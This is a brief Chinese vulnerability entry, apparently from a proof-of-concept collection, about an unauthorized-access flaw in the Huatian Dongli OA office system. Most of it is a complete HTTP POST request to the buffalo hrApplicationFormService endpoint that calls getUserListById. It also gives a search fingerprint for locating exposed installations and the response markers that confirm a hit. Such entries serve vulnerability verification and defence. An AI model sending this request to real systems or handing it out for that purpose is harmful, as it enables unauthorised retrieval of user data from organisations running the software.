﻿# 华天动力OA办公系统存在未授权访问漏洞

> 更新时间：2024-01-17

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app:"华天动力 OA"

> 验证脚本：HTTP

```
POST /OAapp/bfapp/buffalo/hrApplicationFormService HTTP/1.1
Pragma: no-cache
Accept: application/json, text/plain, */*
Cache-Control: no-cache
Content-Type: text/xml;charset=utf-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=E23F65531C015A84CE70FBBEAFDA5296
Connection: close

   <buffalo-call>
        <method>getUserListById</method>
        <boolean>1</boolean>
        <string></string>
        <string>2</string>
        <string></string>
        <string></string>
        <boolean>1</boolean>
        <boolean>1</boolean>
   </buffalo-call>
```

> 响应代码特征：200

> 响应内容特征：buffalo-reply

> 上传文件定位：


> 验证文件来源：华天动力OA办公系统存在未授权访问漏洞.poc
